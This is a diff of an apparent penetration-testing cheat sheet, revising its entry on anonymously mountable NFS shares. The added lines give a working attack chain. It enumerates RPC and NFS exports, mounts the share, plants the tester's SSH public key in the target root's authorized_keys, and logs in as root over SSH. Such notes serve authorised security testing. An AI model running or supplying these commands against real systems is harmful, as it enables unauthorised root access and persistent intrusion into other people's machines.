@@ -3,14 +3,16 @@ Unix
 
 # NFS Shares Anonymous Mountable
 
-rpcinfo -p <target-IP>
+rpcinfo -p <target IP>
 
 showmount -e <target IP>
-mount -t nfs -o nolock <target-IP>:/share /mnt/tmp
 
-cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
-
-umount /mnt/tmp
+mkdir /tmp/test
+mount -t nfs -o nolock <target IP>:/share /tmp/test/
+cat ~/.ssh/id_rsa.pub >> /tmp/test/root/.ssh/authorized_keys
+umount /tmp/test
+ssh root@<target IP>
+id
 ------------------------------------------------------------------------------------------------------
 
 # Rstatd enabled
